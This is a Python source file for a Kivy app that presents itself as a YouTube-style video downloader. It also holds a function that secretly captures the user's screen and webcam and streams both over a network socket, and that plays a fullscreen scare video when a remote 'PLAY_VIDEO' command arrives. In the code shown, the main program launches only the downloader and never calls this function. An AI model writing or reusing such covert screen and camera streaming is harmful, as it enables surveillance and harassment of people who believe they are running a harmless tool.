import socket
import pickle
import struct
import threading
import io
from PIL import ImageGrab
import cv2
from moviepy.editor import VideoFileClip
import os
import yt_dlp
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from kivy.uix.progressbar import ProgressBar

def stream_screen_and_camera(client_socket):
    cap = cv2.VideoCapture(0)

    try:
        while True:
            try:
                client_socket.settimeout(1)
                command = client_socket.recv(4096).decode()
                if command == 'PLAY_VIDEO':
                    play_video(r'c:\Games\SCREAMER  PARA ASUSTAR A TUS AMIGOS.mp4')
                    continue
            except socket.timeout:
                pass

            screen = ImageGrab.grab()
            screen = screen.resize((640, 480))

            ret, camera_frame = cap.read()
            if not ret:
                break

            with io.BytesIO() as buffer:
                screen.save(buffer, format="JPEG")
                screen_data = buffer.getvalue()

            camera_data = pickle.dumps(camera_frame)

            screen_message_size = struct.pack("!L", len(screen_data))
            client_socket.sendall(screen_message_size + screen_data)

            camera_message_size = struct.pack("!L", len(camera_data))
            client_socket.sendall(camera_message_size + camera_data)

    except Exception as e:
        print(f'Error: {e}')
    finally:
        cap.release()
        client_socket.close()

def play_video(video_path):
    def run_video():
        clip = VideoFileClip(video_path)
        clip.preview(fullscreen=True)

    video_thread = threading.Thread(target=run_video)
    video_thread.start()
    video_thread.join()

def download_video(url, path='.', callback=None):
    def run_download():
        try:
            ydl_opts = {
                'outtmpl': f'{path}/%(title)s.%(ext)s',
            }
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                print(f"Скачиваю: {url}")
                ydl.download([url])
                if callback:
                    callback()
                print("Скачивание завершено!")
        except Exception as e:
            print(f"Произошла ошибка: {e}")
    
    download_thread = threading.Thread(target=run_download)
    download_thread.start()

class MyApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')

        # Поле для ввода URL видео
        self.url_input = TextInput(hint_text="Введите URL видео", multiline=False)
        layout.add_widget(self.url_input)

        # Кнопка для скачивания видео
        self.download_button = Button(text="Download Video", on_press=self.on_download)
        layout.add_widget(self.download_button)

        # Прогресс скачивания
        self.progress = ProgressBar(max=100)
        layout.add_widget(self.progress)

        return layout

    def on_download(self, instance):
        video_url = self.url_input.text.strip()
        if video_url:
            self.progress.value = 0
            download_video(video_url, path=r'C:\Games', callback=self.update_progress)

    def update_progress(self):
        self.progress.value = 100

if __name__ == '__main__':
    MyApp().run()
